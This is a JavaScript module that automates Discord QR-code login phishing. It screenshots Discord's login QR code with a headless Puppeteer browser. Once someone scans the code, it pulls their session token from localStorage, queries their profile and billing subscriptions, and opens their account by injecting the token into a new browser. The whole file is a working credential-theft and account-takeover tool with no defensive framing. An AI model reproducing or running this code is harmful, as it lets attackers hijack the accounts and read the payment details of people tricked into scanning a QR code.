const puppeteer = require("puppeteer");
const got = require("got");

class DiscordQRCodeTokenHandler {
  constructor(token) {
    this.$browser = null;
    this.$page = null;

    this.$openedBrowser = null;

    this.token = token;
    this.qr = null;
    this.user = null;

    this.loginUrl = "https://discord.com/login";
    this.discordUserApi = "https://discord.com/api/v9/users/@me";
    this.discordSubscriptionApi =
      "https://discordapp.com/api/v9/users/@me/billing/subscriptions";
    this.httpHeader = {
      accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "user-agent":
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "fr-FR,fr;q=0.9,fr;q=0.8",
    };
  }

  async getQRCode(options = {}) {
    this.$browser = await puppeteer.launch({ headless: true });
    this.$page = (await this.$browser.pages())[0];

    const page = this.$page;

    await this.$page.setViewport({
      width: 1920,
      height: 1080,
    });

    await page.setExtraHTTPHeaders(this.httpHeader);

    await page.goto(this.loginUrl, {
      waitUntil: "domcontentloaded",
    });

    await page.waitForSelector("canvas");

    const canvas = await page.$("canvas");
    const parentCanvas = await canvas.getProperty("parentNode");
    const qr = await parentCanvas.getProperty("parentNode");

    const data = await qr.screenshot(
      options.path ? { path: options.path } : {}
    );

    this.qr = data;

    return data;
  }

  async listenForToken() {
    const page = this.$page;

    await page.waitForNavigation({ timeout: 60000 });

    const token = await page.evaluate(() => {
      window.dispatchEvent(new Event("beforeunload"));

      const iframe = document.createElement("iframe");
      iframe.style.display = "none";
      document.body.appendChild(iframe);
      const localStorage = iframe.contentWindow.localStorage;
      return JSON.parse(localStorage.token);
    });

    this.token = token;

    return token;
  }

  async getDiscordAccountInfo(token) {
    token = token ?? this.token;

    if (!token) throw new Error("Invalide token");

    const scrapInfo = await got.get(this.discordUserApi, {
      headers: { Authorization: token },
    });
    const info = JSON.parse(scrapInfo.body);

    const scrapSub = await got.get(this.discordSubscriptionApi, {
      headers: { Authorization: token },
    });
    const sub = JSON.parse(scrapSub.body);

    const user = {
      ...info,
      user: info.username + "#" + info.discriminator,
      avatar_url:
        "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar,
      subscription: sub,
    };

    this.user = user;

    return user;
  }

  async openDiscordAccount(token) {
    token = token ?? this.token;

    if (!token) throw new Error("Invalide token");

    this.$openedBrowser = await puppeteer.launch({
      headless: false,
      defaultViewport: null,
      args: ["--start-fullscreen"],
    });

    const page = (await this.$openedBrowser.pages())[0];

    await page.goto(this.loginUrl, {
      waitUntil: "domcontentloaded",
    });

    await page.evaluate((token) => {
      setInterval(() => {
        document.body.appendChild(
          document.createElement`iframe`
        ).contentWindow.localStorage.token = `"${token}"`;
      }, 50);
      setTimeout(() => {
        location.reload();
      }, 2500);
    }, token);
  }

  async closeOpenedBrowserConnection() {
    const browser = this.$openedBrowser;
    await browser.close();
  }

  async closeConnection() {
    const browser = this.$browser;
    await browser.close();
  }
}

module.exports = DiscordQRCodeTokenHandler;
